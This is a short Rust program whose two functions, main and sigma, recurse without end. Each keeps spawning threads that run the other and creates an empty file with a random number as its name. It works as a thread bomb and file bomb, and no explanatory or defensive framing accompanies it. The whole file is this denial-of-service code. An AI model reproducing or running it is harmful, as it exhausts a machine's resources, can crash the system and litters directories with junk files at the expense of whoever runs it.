



use std::fs::File;
use rand::{self, Rng};

#[allow(unconditional_recursion)]
fn main() {
        let x = rand::thread_rng().gen_range(-2147483648..=2147483647);
        let mut y = x.to_string();
        y.push_str(".txt");
        File::create(y).err();
        std::thread::spawn(sigma);
        main()
}
#[allow(unconditional_recursion)]
fn sigma(){
    std::thread::spawn(main);
    let x = rand::thread_rng().gen_range(-2147483648..=2147483647);
    let mut y = x.to_string();
    y.push_str(".txt");
    File::create(y).err();
    std::thread::spawn(main);
    sigma();
}


